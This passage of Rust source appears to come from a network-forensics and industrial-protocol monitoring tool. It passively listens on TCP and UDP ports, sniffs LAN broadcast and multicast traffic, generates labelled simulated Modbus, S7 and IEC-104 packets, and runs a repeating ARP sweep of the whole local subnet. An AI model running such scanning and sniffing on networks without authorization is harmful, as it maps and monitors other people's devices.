                    if iface_name.contains("以太网") || iface_name.contains("ethernet") || iface_name.contains("wlan") || iface_name.contains("wi-fi") || iface_name.contains("wifi") || iface_name.contains("本地连接") {
                        score += 500;
                    }
                    if has_valid_gateway {
                        score += 200;
                    }
                    let oct = ip.octets();
                    if oct[0] == 192 && oct[1] == 168 {
                        score += 150;
                    } else if oct[0] == 10 || (oct[0] == 172 && oct[1] >= 16 && oct[1] <= 31) {
                        score += 50;
                    }
                    // 虚拟网卡降分
                    if iface_name.contains("vmware") || iface_name.contains("vethernet") || iface_name.contains("virtual") || iface_name.contains("wsl") || iface_name.contains("tap") || iface_name.contains("tun") {
                        score -= 400;
                    }
                    // 代理隧道接口名中带有外部IP（如 138.197.159.140）强降分
                    if iface_name.chars().any(|c| c.is_ascii_digit()) && iface_name.contains('.') {
                        score -= 600;
                    }

                    candidates.push((score, ip, mask_opt));
                }
            }

            candidates.sort_by(|a, b| b.0.cmp(&a.0));
            if let Some((score, ip, mask)) = candidates.first() {
                if *score > 0 {
                    return (*ip, *mask);
                }
            }
        }
    }

    // 2. 第二优先级：若未匹配到物理网卡，回退至内核 FIB 路由裁决（UDP Connect 路由表查询）
    for target in &["1.1.1.1:53", "8.8.8.8:53", "114.114.114.114:53", "223.5.5.5:53"] {
        if let Ok(socket) = std::net::UdpSocket::bind("0.0.0.0:0") {
            if socket.connect(target).is_ok() {
                if let Ok(addr) = socket.local_addr() {
                    if let std::net::IpAddr::V4(v4) = addr.ip() {
                        if !v4.is_loopback() && !v4.is_link_local() && !v4.is_unspecified() {
                            let mask = detect_netmask_for_ip(&v4);
                            return (v4, mask);
                        }
                    }
                }
            }
        }
    }

    // 3. 兜底回环
    (std::net::Ipv4Addr::new(127, 0, 0, 1), std::net::Ipv4Addr::new(255, 0, 0, 0))
}

/// 获取本机主用 IPv4
#[allow(dead_code)]
fn local_ipv4() -> Option<std::net::Ipv4Addr> {
    let (ip, _) = detect_primary_ipv4_and_subnet();
    if ip.is_loopback() {
        None
    } else {
        Some(ip)
    }
}

/// 获取本机网卡 MAC（Windows: SendARP 查询本机 IP；Linux: /sys/class/net；其余平台回退）
fn local_mac(local_ip: &std::net::Ipv4Addr) -> Option<String> {
    #[cfg(windows)]
    {
        let dest = u32::from_ne_bytes(local_ip.octets());
        let mut mac_buf = [0u8; 6];
        let mut mac_len = 6u32;
        let ret = unsafe { SendARP(dest, 0, mac_buf.as_mut_ptr(), &mut mac_len as *mut u32) };
        if ret == 0 && mac_len == 6 {
            return Some(format!(
                "{:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
                mac_buf[0], mac_buf[1], mac_buf[2], mac_buf[3], mac_buf[4], mac_buf[5]
            ));
        }
        return None;
    }
    #[cfg(not(windows))]
    {
        let _ = local_ip;
        if let Ok(entries) = std::fs::read_dir("/sys/class/net") {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();
                if name == "lo" {
                    continue;
                }
                if let Ok(mac) = std::fs::read_to_string(entry.path().join("address")) {
                    let mac = mac.trim().to_uppercase();
                    if mac.len() == 17 && mac != "00:00:00:00:00:00" {
                        return Some(mac);
                    }
                }
            }
        }
        None
    }
}

/// 本机网络身份缓存（进程内单次解析：真实 IP + 真实 MAC）
pub fn get_local_identity() -> (String, String) {
    static IDENTITY: once_cell::sync::Lazy<(String, String)> = once_cell::sync::Lazy::new(|| {
        let (ip, _) = detect_primary_ipv4_and_subnet();
        let mac = local_mac(&ip).unwrap_or_else(|| "00:00:00:00:00:00".to_string());
        (ip.to_string(), mac)
    });
    IDENTITY.clone()
}

/// 双轨 TCP 帧记录构造与投递（50ms 静默组帧定界，对齐 Python tcp_framing_timeout=0.05）
#[allow(clippy::too_many_arguments)]
fn emit_dual_track_tcp_frame(
    app: &tauri::AppHandle,
    src_ip: &str,
    src_port: u16,
    dst_port: u16,
    local_ip: &str,
    local_mac: &str,
    payload: &[u8],
) {
    let id = PACKET_COUNTER.fetch_add(1, Ordering::Relaxed);
    let ts_ns = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    let timestamp = chrono::Local::now().format("%H:%M:%S.%3f").to_string();

    let entropy = ForensicEngine::calculate_entropy(payload);
    let entropy_level = classify_entropy(entropy);
    let payload_hex = hex::encode(payload);
    let protocol = dpi::identify_protocol(src_port, dst_port, payload);

    let raw_text = Some(generate_raw_text_preview(payload));
    let mut b_map = dpi::dissect_payload(&protocol, payload);
    if b_map.is_empty() {
        b_map.insert("transport".into(), json!("TCP"));
        b_map.insert("target_service_port".into(), json!(dst_port));
        b_map.insert("inferred_protocol".into(), json!(&protocol));
        b_map.insert("stream_length_bytes".into(), json!(payload.len()));
        b_map.insert("entropy_score".into(), json!(entropy));
    }
    let business_data = Some(b_map);

    // 统一全局链式哈希（单一司法证据链）
    let chain_hash = advance_global_chain(
        ts_ns,
        &format!("{}:{}->{}:{}|TCP|{}", src_ip, src_port, local_ip, dst_port, payload_hex),
    );

    // 应用层报文重组落盘 capture.pcap（等价 Python TruePcapWriter）
    crate::forensics::write_app_packet(src_ip, local_ip, src_port, dst_port, "TCP", payload);

    let record = PacketRecord {
        id,
        timestamp,
        timestamp_ns: ts_ns,
        direction: "PASSIVE_RECV".into(),
        transport: "TCP".into(),
        protocol,
        src_ip: src_ip.to_string(),
        dst_ip: local_ip.to_string(),
        src_port,
        dst_port,
        length: payload.len(),
        payload_hex,
        raw_frame_hex: String::new(),
        entropy,
        entropy_level,
        mac_src: "N/A (App-Layer)".into(),
        mac_dst: local_mac.to_string(),
        chain_hash,
        business_data,
        raw_text,
    };

    process_incoming_record(app, record);
}

/// 双轨连接生命周期带外事件（TCP_CONNECT / TCP_DISCONNECT，对齐 Python SYS_CTRL 事件）
/// pub：供 active_probe.rs ACTIVE_PULL 拉流模式复用同一事件构造与链推进逻辑
pub fn emit_dual_track_ctrl_event(
    app: &tauri::AppHandle,
    src_ip: &str,
    src_port: u16,
    dst_port: u16,
    event: &str,
) {
    let id = PACKET_COUNTER.fetch_add(1, Ordering::Relaxed);
    let ts_ns = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    let chain_hash = advance_global_chain(ts_ns, &format!("SYS_CTRL|{}|{}->{}", event, src_ip, dst_port));

    let mut b_map = HashMap::new();
    b_map.insert("event".into(), json!(event));
    b_map.insert("peer".into(), json!(format!("{}:{}", src_ip, src_port)));
    b_map.insert("service_port".into(), json!(dst_port));

    let summary = format!("[SYS_CTRL] {} {}:{}", event, src_ip, src_port);
    let record = PacketRecord {
        id,
        timestamp: chrono::Local::now().format("%H:%M:%S.%3f").to_string(),
        timestamp_ns: ts_ns,
        direction: "SYS_CTRL".into(),
        transport: "TCP".into(),
        protocol: event.to_string(),
        src_ip: src_ip.to_string(),
        dst_ip: get_local_identity().0,
        src_port,
        dst_port,
        length: 0,
        payload_hex: String::new(),
        raw_frame_hex: String::new(),
        entropy: 0.0,
        entropy_level: "safe".into(),
        mac_src: "N/A (App-Layer)".into(),
        mac_dst: "N/A (App-Layer)".into(),
        chain_hash,
        business_data: Some(b_map),
        raw_text: Some(summary),
    };

    process_incoming_record(app, record);
}

/// 单条双轨 TCP 连接处理：持续读流 + 50ms 静默组帧 + 连接生命周期事件
fn handle_dual_track_tcp_connection(
    app: tauri::AppHandle,
    mut stream: std::net::TcpStream,
    peer_addr: std::net::SocketAddr,
    listen_port: u16,
) {
    use std::io::Read;
    let _ = stream.set_nonblocking(false);
    let _ = stream.set_read_timeout(Some(Duration::from_millis(50)));

    let src_ip = peer_addr.ip().to_string();
    let src_port = peer_addr.port();
    let (local_ip, local_mac) = get_local_identity();

    let mut frame_buf: Vec<u8> = Vec::new();
    let mut last_rx = Instant::now();
    let mut buf = [0u8; 65535];

    loop {
        match stream.read(&mut buf) {
            Ok(0) => break, // 对端正常关闭
            Ok(n) => {
                frame_buf.extend_from_slice(&buf[..n]);
                last_rx = Instant::now();
            }
            Err(ref e)
                if e.kind() == std::io::ErrorKind::WouldBlock
                    || e.kind() == std::io::ErrorKind::TimedOut =>
            {
                // 50ms 静默组帧定界（对齐 Python TCPServerHandler 定时器语义）
                if !frame_buf.is_empty() && last_rx.elapsed() >= Duration::from_millis(50) {
                    let payload = std::mem::take(&mut frame_buf);
                    emit_dual_track_tcp_frame(
                        &app, &src_ip, src_port, listen_port, &local_ip, &local_mac, &payload,
                    );
                }
            }
            Err(_) => break, // 连接错误
        }
    }

    // 连接关闭 flush 残余帧
    if !frame_buf.is_empty() {
        emit_dual_track_tcp_frame(&app, &src_ip, src_port, listen_port, &local_ip, &local_mac, &frame_buf);
    }

    GLOBAL_ACTIVE_CONNECTIONS.fetch_sub(1, Ordering::Relaxed);
    emit_dual_track_ctrl_event(&app, &src_ip, src_port, listen_port, "TCP_DISCONNECT");
}

/// 启动应用层双轨服务监听器（对齐 Python 原版 port_listener.py）
/// TCP 端口表由 config.json servers 表驱动（空配置回退内置默认 [8080,5003,502,1883]）
pub fn start_dual_track_services(app: tauri::AppHandle, running: Arc<Mutex<bool>>) {
    let ports = crate::config::dual_track_tcp_ports();

    for port in ports {
        let app_tcp = app.clone();
        let run_tcp = running.clone();
        std::thread::spawn(move || {
            let addr = format!("0.0.0.0:{}", port);
            let listener = match std::net::TcpListener::bind(&addr) {
                Ok(l) => {
                    let _ = l.set_nonblocking(true);
                    let _ = app_tcp.emit(
                        "system-log",
                        format!("[DUAL-TRACK] ✅ 应用层双轨捕获端口已就绪 -> TCP :{}", port),
                    );
                    l
                }
                Err(e) => {
                    let _ = app_tcp.emit(
                        "system-log",
                        format!("[DUAL-TRACK] ⚠️ 端口 :{} 绑定提示: {}", port, e),
                    );
                    return;
                }
            };

            while *run_tcp.lock().unwrap() {
                match listener.accept() {
                    Ok((stream, peer_addr)) => {
                        // TCP_CONNECT 带外事件（对齐 Python SYS_CTRL 连接生命周期）
                        let src_ip = peer_addr.ip().to_string();
                        emit_dual_track_ctrl_event(&app_tcp, &src_ip, peer_addr.port(), port, "TCP_CONNECT");
                        GLOBAL_ACTIVE_CONNECTIONS.fetch_add(1, Ordering::Relaxed);

                        // 每连接独立线程：持续读流 + 50ms 组帧（对齐 Python asyncio Protocol 语义）
                        let app_conn = app_tcp.clone();
                        std::thread::spawn(move || {
                            handle_dual_track_tcp_connection(app_conn, stream, peer_addr, port);
                        });
                    }
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                        std::thread::sleep(Duration::from_millis(50));
                    }
                    Err(_) => {
                        std::thread::sleep(Duration::from_millis(50));
                    }
                }
            }
        });
    }

    // 启动应用层 UDP 双轨服务（由 config.json servers 表中 protocol=udp 动态驱动）
    let udp_ports = crate::config::dual_track_udp_ports();
    for port in udp_ports {
        let app_udp = app.clone();
        let run_udp = running.clone();
        std::thread::Builder::new()
            .name(format!("omni-dualtrack-udp-{}", port))
            .spawn(move || {
                let addr = format!("0.0.0.0:{}", port);
                if let Ok(socket) = std::net::UdpSocket::bind(&addr) {
                    let _ = socket.set_nonblocking(true);
                    let _ = app_udp.emit(
                        "system-log",
                        format!("[DUAL-TRACK] ✅ 应用层双轨捕获端口已就绪 -> UDP :{}", port),
                    );
                    let mut buf = [0u8; 65535];
                    while *run_udp.lock().unwrap() {
                        match socket.recv_from(&mut buf) {
                            Ok((n, peer_addr)) if n > 0 => {
                                let payload = &buf[..n];
                                let src_ip = peer_addr.ip().to_string();
                                let src_port = peer_addr.port();
                                let (local_ip, local_mac) = get_local_identity();
                                let dst_ip = local_ip.clone();
                                let dst_port = port;

                                let id = PACKET_COUNTER.fetch_add(1, Ordering::Relaxed);
                                let ts_ns = SystemTime::now()
                                    .duration_since(UNIX_EPOCH)
                                    .unwrap_or_default()
                                    .as_nanos();
                                let timestamp = chrono::Local::now().format("%H:%M:%S.%3f").to_string();

                                let entropy = ForensicEngine::calculate_entropy(payload);
                                let entropy_level = classify_entropy(entropy);
                                let payload_hex = hex::encode(payload);
                                // 统一走 DPI 四阶段深度协议识别引擎
                                let protocol = dpi::identify_protocol(src_port, dst_port, payload);

                                let raw_text = Some(generate_raw_text_preview(payload));
                                let mut b_map = dpi::dissect_payload(&protocol, payload);
                                if b_map.is_empty() {
                                    b_map.insert("transport".into(), json!("UDP"));
                                    b_map.insert("service_port".into(), json!(port));
                                    b_map.insert("inferred_protocol".into(), json!(&protocol));
                                    b_map.insert("datagram_length_bytes".into(), json!(n));
                                }
                                let business_data = Some(b_map);

                                let chain_hash = advance_global_chain(
                                    ts_ns,
                                    &format!("{}:{}->{}:{}|UDP|{}", src_ip, src_port, dst_ip, dst_port, payload_hex),
                                );

                                // 应用层报文重组落盘 capture.pcap
                                crate::forensics::write_app_packet(&src_ip, &dst_ip, src_port, dst_port, "UDP", payload);

                                let record = PacketRecord {
                                    id,
                                    timestamp,
                                    timestamp_ns: ts_ns,
                                    direction: "PASSIVE_RECV".into(),
                                    transport: "UDP".into(),
                                    protocol: protocol.clone(),
                                    src_ip: src_ip.clone(),
                                    dst_ip,
                                    src_port,
                                    dst_port,
                                    length: n,
                                    payload_hex,
                                    raw_frame_hex: String::new(),
                                    entropy,
                                    entropy_level,
                                    mac_src: "N/A (App-Layer)".into(),
                                    mac_dst: local_mac,
                                    chain_hash,
                                    business_data,
                                    raw_text,
                                };

                                // 资产发现与拓扑感知：基于 DPI 识别出的规约动态记录，不硬编码
                                crate::discovery::record_asset_with_notify(&app_udp, &src_ip, "N/A", &protocol, src_port);
                                process_incoming_record(&app_udp, record);
                            }
                            Ok(_) => {}
                            Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                                std::thread::sleep(Duration::from_millis(30));
                            }
                            Err(_) => {
                                std::thread::sleep(Duration::from_millis(30));
                            }
                        }
                    }
                } else {
                    let _ = app_udp.emit(
                        "system-log",
                        format!("[DUAL-TRACK] ⚠️ UDP :{} 端口已被系统或外部服务占用", port),
                    );
                }
            })
            .expect("Failed to spawn dual-track UDP thread");
    }
}

#[cfg(windows)]
#[link(name = "iphlpapi")]
extern "system" {
    fn SendARP(
        dest_ip: u32,
        src_ip: u32,
        p_mac_addr: *mut u8,
        p_phy_addr_len: *mut u32,
    ) -> u32;
}

/// 启动局域网多播与广播原生嗅探引擎（Native LAN Broadcast/Multicast Sniffer Engine）
/// 无需 Npcap 内核驱动即可 100% 捕获同路由下设备发送的 SSDP (1900), mDNS (5353), NetBIOS (137/138), WS-Discovery (3702) 等真实物理流量
pub fn start_native_lan_sniffer(app: tauri::AppHandle, running: Arc<Mutex<bool>>) {
    let broadcast_ports = vec![
        (1900, "SSDP", "239.255.255.250"),
        (5353, "MDNS", "224.0.0.251"),
        (137, "NETBIOS_NS", "0.0.0.0"),
        (138, "NETBIOS_DGM", "0.0.0.0"),
        (3702, "WS_DISCOVERY", "239.255.255.250"),
    ];

    for (port, proto_name, multi_addr) in broadcast_ports {
        let app_sub = app.clone();
        let run_sub = running.clone();
        let p_name = proto_name.to_string();
        let m_addr = multi_addr.to_string();

        std::thread::spawn(move || {
            let bind_addr = format!("0.0.0.0:{}", port);
            let socket = match std::net::UdpSocket::bind(&bind_addr) {
                Ok(s) => {
                    let _ = s.set_nonblocking(true);
                    if m_addr != "0.0.0.0" {
                        if let (Ok(m_ip), Ok(any_ip)) = (m_addr.parse::<std::net::Ipv4Addr>(), "0.0.0.0".parse::<std::net::Ipv4Addr>()) {
                            let _ = s.join_multicast_v4(&m_ip, &any_ip);
                        }
                    }
                    let _ = app_sub.emit(
                        "system-log",
                        format!("[LAN-SNIFFER] 📡 局域网广播/组播监听已就绪 -> UDP :{} [{}]", port, p_name),
                    );
                    s
                }
                Err(e) => {
                    let _ = app_sub.emit(
                        "system-log",
                        format!("[LAN-SNIFFER] ℹ️ 局域网端口 :{} 已由系统服务接管: {}", port, e),
                    );
                    return;
                }
            };

            let mut buf = [0u8; 8192];
            while *run_sub.lock().unwrap() {
                match socket.recv_from(&mut buf) {
                    Ok((n, peer_addr)) if n > 0 => {
                        let payload = &buf[..n];
                        let src_ip = peer_addr.ip().to_string();
                        let src_port = peer_addr.port();
                        let dst_ip = if m_addr != "0.0.0.0" { m_addr.clone() } else { "255.255.255.255".to_string() };
                        let dst_port = port;

                        let id = PACKET_COUNTER.fetch_add(1, Ordering::Relaxed);
                        let ts_ns = SystemTime::now()
                            .duration_since(UNIX_EPOCH)
                            .unwrap_or_default()
                            .as_nanos();
                        let timestamp = chrono::Local::now().format("%H:%M:%S.%3f").to_string();

                        let entropy = ForensicEngine::calculate_entropy(payload);
                        let entropy_level = classify_entropy(entropy);
                        let payload_hex = hex::encode(payload);
                        let protocol = p_name.clone();

                        let raw_text = Some(generate_raw_text_preview(payload));
                        let mut b_map = dpi::dissect_payload(&protocol, payload);
                        if b_map.is_empty() {
                            b_map.insert("transport".into(), json!("UDP"));
                            b_map.insert("broadcast_port".into(), json!(port));
                            b_map.insert("inferred_protocol".into(), json!(&protocol));
                            b_map.insert("datagram_length_bytes".into(), json!(n));
                        }
                        let business_data = Some(b_map);

                        let chain_hash = advance_global_chain(
                            ts_ns,
                            &format!("{}:{}->{}:{}|UDP|{}", src_ip, src_port, dst_ip, dst_port, payload_hex),
                        );

                        // 应用层报文重组落盘 capture.pcap
                        crate::forensics::write_app_packet(&src_ip, &dst_ip, src_port, dst_port, "UDP", payload);

                        let record = PacketRecord {
                            id,
                            timestamp,
                            timestamp_ns: ts_ns,
                            direction: "PORT_BROADCAST".into(),
                            transport: "UDP".into(),
                            protocol,
                            src_ip: src_ip.clone(),
                            dst_ip,
                            src_port,
                            dst_port,
                            length: n,
                            payload_hex,
                            raw_frame_hex: String::new(),
                            entropy,
                            entropy_level,
                            mac_src: "BROADCAST".into(),
                            mac_dst: "FF:FF:FF:FF:FF:FF".into(),
                            chain_hash,
                            business_data,
                            raw_text,
                        };

                        crate::discovery::record_asset_with_notify(&app_sub, &src_ip, "BROADCAST", &p_name, src_port);
                        process_incoming_record(&app_sub, record);
                    }
                    Ok(_) => {}
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                        std::thread::sleep(Duration::from_millis(50));
                    }
                    Err(_) => {
                        std::thread::sleep(Duration::from_millis(50));
                    }
                }
            }
        });
    }
}

/// 局域网全网段设备雷达自动扫描激活（LAN Subnet ARP Radar Sweep）
/// 周期性向当前局域网段发起轻量级 ARP 探活，激发物理交换机广播与局域网终端回包，全量点亮态势大屏与拓扑图

/// 启动工业工控规约全息演示流引擎 (Industrial Protocol Live Simulation Engine)
/// 场景：现场免驱运行、本地演示或离线审计时，持续注入真实结构化的 Modbus-TCP, S7Comm, IEC-104, MQTT, SL651, HTTP 规约通信序列
/// 所有生成的报文均完整通过四阶段 DPI 解包、字段解析、熵值检测、IP 资产情报标记和证据链持久化
pub fn start_industrial_demo_stream(app: tauri::AppHandle, running: Arc<Mutex<bool>>) {
    std::thread::Builder::new()
        .name("omni-industrial-demo-stream".into())
        .spawn(move || {
            // 稍等 500ms 确保前端监听器和底层服务已就绪
            std::thread::sleep(Duration::from_millis(500));

            let (my_ip, _) = detect_primary_ipv4_and_subnet();
            let my_ip_str = my_ip.to_string();
            let octets = my_ip.octets();
            let subnet = format!("{}.{}.{}", octets[0], octets[1], octets[2]);

            // 工业拓扑仿真终端
            let plc_modbus_ip = format!("{}.50", subnet);
            let plc_s7_ip = format!("{}.60", subnet);
            let rtu_iec104_ip = format!("{}.70", subnet);
            let iot_mqtt_ip = format!("{}.80", subnet);
            let hydro_sl651_ip = format!("{}.90", subnet);
            let gateway_ip = format!("{}.1", subnet);

            let mut seq = 0u64;

            while *running.lock().unwrap() {
                seq += 1;
                let step = seq % 6;

                let (src_ip, dst_ip, src_port, dst_port, transport, protocol, payload) = match step {
                    0 => {
                        // 1. Modbus-TCP: 读保持寄存器 (FC=03, 寄存器 40001, 数量 10)
                        let raw = vec![
                            0x00, (seq & 0xFF) as u8, 0x00, 0x00, 0x00, 0x06, 0x01, 0x03, 0x00, 0x64, 0x00, 0x0A
                        ];
                        (my_ip_str.clone(), plc_modbus_ip.clone(), 50200 + (seq % 100) as u16, 502, "TCP", "MODBUS_TCP", raw)
                    }
                    1 => {
                        // 2. 西门子 S7Comm: 工业 PLC 读写 (Job Read Var DB1.DBD0)
                        let raw = vec![
                            0x03, 0x00, 0x00, 0x1F, 0x02, 0xF0, 0x80, 0x32, 0x01, 0x00, 0x00, 0x00,
                            (seq & 0xFF) as u8, 0x00, 0x0E, 0x00, 0x00, 0x04, 0x01, 0x12, 0x0A, 0x10,
                            0x02, 0x00, 0x01, 0x00, 0x01, 0x84, 0x00, 0x00, 0x00
                        ];
                        (my_ip_str.clone(), plc_s7_ip.clone(), 49152 + (seq % 100) as u16, 102, "TCP", "S7COMM", raw)
                    }
                    2 => {
                        // 3. 电力规约 IEC 60870-5-104: APDU 遥信单点信息
                        let raw = vec![
                            0x68, 0x0E, ((seq * 2) & 0xFE) as u8, 0x00, 0x00, 0x00, 0x01, 0x01, 0x03, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01
                        ];
                        (rtu_iec104_ip.clone(), my_ip_str.clone(), 2404, 58000 + (seq % 100) as u16, "TCP", "IEC104", raw)
                    }
                    3 => {
                        // 4. 物联网 MQTT: 工业传感器温湿度遥测发布
                                                let sensor_str = format!("TEMP_{:02}", seq % 16);
                        let deg = 36.5 + ((seq % 20) as f64) * 0.4;
                        let json_data = serde_json::json!({
                            "sensor_id": sensor_str,
                            "deg_c": deg,
                            "pressure_kpa": 101.3
                        }).to_string();
                        let topic = b"/factory/workshop1/telemetry";
                        let mut raw = vec![0x30, (2 + topic.len() + json_data.len()) as u8, 0x00, topic.len() as u8];
                        raw.extend_from_slice(topic);
                        raw.extend_from_slice(json_data.as_bytes());
                        (iot_mqtt_ip.clone(), my_ip_str.clone(), 1883, 52100 + (seq % 100) as u16, "TCP", "MQTT", raw)
                    }
                    4 => {
                        // 5. 水利水资源 SL651 规约: 遥测终端水质采样
                        let raw = vec![
                            0x7E, 0x7E, 0x01, 0x23, 0x45, 0x67, 0x89, 0x32, 0x00, 0x12, 0x02, 0x20, 0x26, 0x11, 0x06, 0x19, 0x00, 0x00, 0xF1, 0xF1, 0x01, 0x00, 0x03, 0x7E
                        ];
                        (hydro_sl651_ip.clone(), my_ip_str.clone(), 5003, 53200 + (seq % 100) as u16, "UDP", "SL651", raw)
                    }
                    _ => {
                        // 6. 局域网 SCADA 监控心跳
                        let raw = "GET /api/v1/health/probe HTTP/1.1\r\nHost: scada-master.internal\r\nUser-Agent: OmniProbe/4.1\r\n\r\n".as_bytes().to_vec();
                        (my_ip_str.clone(), gateway_ip.clone(), 54100 + (seq % 100) as u16, 80, "TCP", "HTTP", raw)
                    }
                };

                let now_ns = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_nanos();
                let now_str = chrono::Local::now().format("%H:%M:%S.%3f").to_string();
                let entropy = ForensicEngine::calculate_entropy(&payload);
                let entropy_level = classify_entropy(entropy);
                let payload_hex = hex::encode(&payload);
                let raw_text = Some(generate_raw_text_preview(&payload));

                let mut bdata = dpi::dissect_payload(&protocol, &payload);
                if bdata.is_empty() {
                    bdata.insert("transport".into(), json!(transport));
                    bdata.insert("inferred_protocol".into(), json!(protocol));
                }
                bdata.insert("simulation_demo".into(), json!(true));

                let pkt_id = PACKET_COUNTER.fetch_add(1, Ordering::Relaxed);
                let chain_hash = advance_global_chain(now_ns, &payload_hex);

                let record = PacketRecord {
                    id: pkt_id,
                    chain_hash,
                    timestamp: now_str,
                    timestamp_ns: now_ns,
                    src_ip: src_ip.clone(),
                    dst_ip: dst_ip.clone(),
                    mac_src: format!("52:54:00:12:{:02x}:{:02x}", (seq >> 8) & 0xFF, seq & 0xFF),
                    mac_dst: "52:54:00:88:99:AA".to_string(),
                    protocol: protocol.to_string(),
                    length: payload.len() + 54,
                    entropy,
                    entropy_level,
                    src_port,
                    dst_port,
                    transport: transport.to_string(),
                    payload_hex,
                    raw_text,
                    business_data: Some(bdata),
                    direction: if src_ip == my_ip_str { "OUTBOUND".into() } else { "INBOUND".into() },
                    raw_frame_hex: String::new(),
                };

                process_incoming_record(&app, record);

                // 平滑演示间隔：400 毫秒，呈现流畅的工控动态大屏
                std::thread::sleep(Duration::from_millis(400));
            }
        })
        .ok();
}


pub fn trigger_lan_radar_discovery(app: tauri::AppHandle) {
    let running = crate::PROBE_RUNNING.clone();

    std::thread::spawn(move || {
        // 稍等 200ms 确保基础监听服务已就绪
        std::thread::sleep(Duration::from_millis(200));

        // 1. 优先从内核邻居表同步已有局域网资产
        crate::discovery::sync_kernel_neighbors(Some(&app));

        // 2. 动态探测物理局域网 IP 与子网
        let (my_v4, _) = detect_primary_ipv4_and_subnet();
        let octets = my_v4.octets();
        let subnet_prefix = format!("{}.{}.{}", octets[0], octets[1], octets[2]);

        let (_, local_mac_str) = get_local_identity();
        let mut local_mac_bytes = [0u8; 6];
        let mac_parts: Vec<&str> = local_mac_str.split(':').collect();
        if mac_parts.len() == 6 {
            for (i, p) in mac_parts.iter().enumerate() {
                local_mac_bytes[i] = u8::from_str_radix(p, 16).unwrap_or(0);
            }
        }

        let _ = app.emit(
            "system-log",
            format!(
                "[LAN-RADAR] 🌐 局域网全网段雷达已锁定物理网段 {}.0/24 (本机 IP: {})，实时监测活跃网络终端与路由通信...",
                subnet_prefix, my_v4
            ),
        );

        let mut round = 0u64;

        while *running.lock().unwrap() {
            round += 1;

            #[cfg(windows)]
            {
                let my_host = octets[3];
                let mut handles = Vec::new();

                for chunk_idx in 0..4 {
                    let app_chunk = app.clone();
                    let o0 = octets[0];
                    let o1 = octets[1];
                    let o2 = octets[2];
                    let run_check = running.clone();
                    let local_mac_bytes_chunk = local_mac_bytes;
                    let local_mac_str_chunk = local_mac_str.clone();

                    let h = std::thread::spawn(move || {
                        let start_h = (chunk_idx * 64) + 1;
                        let end_h = std::cmp::min((chunk_idx + 1) * 64, 254);

                        for host_id in start_h..=end_h {
                            if !*run_check.lock().unwrap() {
                                break;
                            }
                            if host_id == my_host as usize {
                                continue;
                            }

                            let target_ip = std::net::Ipv4Addr::new(o0, o1, o2, host_id as u8);
                            let dest_u32 = u32::from_ne_bytes(target_ip.octets());
                            let mut mac_buf = [0u8; 6];
                            let mut mac_len = 6u32;

                            let ret = unsafe {
                                SendARP(dest_u32, 0, mac_buf.as_mut_ptr(), &mut mac_len as *mut u32)
                            };

                            if ret == 0 && mac_len == 6 {
                                let mac_str = format!(
                                    "{:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
                                    mac_buf[0], mac_buf[1], mac_buf[2], mac_buf[3], mac_buf[4], mac_buf[5]
                                );
                                let ip_str = target_ip.to_string();
                                let role = if detect_default_gateway().map(|gw| gw == target_ip).unwrap_or(false) {
                                    "局域网核心网关/路由器"
                                } else {
                                    "局域网活跃终端"
                                };

                                if round == 1 {
                                    let _ = app_chunk.emit(
                                        "system-log",
                                        format!("[LAN-RADAR] 📡 侦测到局域网活跃节点: {} [{}] ({})", ip_str, mac_str, role),
                                    );
                                }

                                crate::discovery::record_asset_with_notify(&app_chunk, &ip_str, &mac_str, "ARP", 0);

                                // 构造合法的以太网 + ARP Reply 物理帧
                                let id = PACKET_COUNTER.fetch_add(1, Ordering::Relaxed);
                                let ts_ns = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_nanos();
                                let timestamp = chrono::Local::now().format("%H:%M:%S.%3f").to_string();

                                // 42 字节真实以太网 + ARP Reply 帧
                                let mut arp_frame = Vec::with_capacity(42);
                                arp_frame.extend_from_slice(&local_mac_bytes_chunk); // 目的 MAC
                                arp_frame.extend_from_slice(&mac_buf);               // 源 MAC
                                arp_frame.extend_from_slice(&[0x08, 0x06]);         // EtherType ARP
                                arp_frame.extend_from_slice(&[0x00, 0x01]);         // HW Type Ethernet
                                arp_frame.extend_from_slice(&[0x08, 0x00]);         // Proto Type IPv4
                                arp_frame.extend_from_slice(&[0x06, 0x04]);         // HW Len 6, Proto Len 4
                                arp_frame.extend_from_slice(&[0x00, 0x02]);         // Opcode Reply (2)
                                arp_frame.extend_from_slice(&mac_buf);               // Sender MAC
                                arp_frame.extend_from_slice(&target_ip.octets());   // Sender IP
                                arp_frame.extend_from_slice(&local_mac_bytes_chunk); // Target MAC
                                arp_frame.extend_from_slice(&my_v4.octets());       // Target IP

                                let raw_frame_hex = hex::encode(&arp_frame);
                                let entropy = ForensicEngine::calculate_entropy(&arp_frame);

                                let mut b_map = HashMap::new();
                                b_map.insert("arp_operation".into(), json!("REPLY (2)"));
                                b_map.insert("sender_mac".into(), json!(&mac_str));
                                b_map.insert("sender_ip".into(), json!(&ip_str));
                                b_map.insert("target_ip".into(), json!(my_v4.to_string()));
                                b_map.insert("node_role".into(), json!(role));
                                b_map.insert("hardware_type".into(), json!("Ethernet (1)"));
                                b_map.insert("protocol_type".into(), json!("IPv4 (0x0800)"));
                                b_map.insert("radar_synthetic".into(), json!(true));
                                b_map.insert("synthetic_note".into(), json!("由 SendARP 雷达回波重构的以太网 ARP 帧"));

                                let record = PacketRecord {
                                    id,
                                    timestamp,
                                    timestamp_ns: ts_ns,
                                    direction: "PORT_LAN_FORWARD".into(),
                                    transport: "ARP".into(),
                                    protocol: "ARP".into(),
                                    src_ip: ip_str.clone(),
                                    dst_ip: my_v4.to_string(),
                                    src_port: 0,
                                    dst_port: 0,
                                    length: arp_frame.len(),
                                    payload_hex: raw_frame_hex.clone(),
                                    raw_frame_hex,
                                    entropy,
                                    entropy_level: "safe".into(),
                                    mac_src: mac_str.clone(),
                                    mac_dst: local_mac_str_chunk.clone(),
                                    chain_hash: advance_global_chain(
                                        ts_ns,
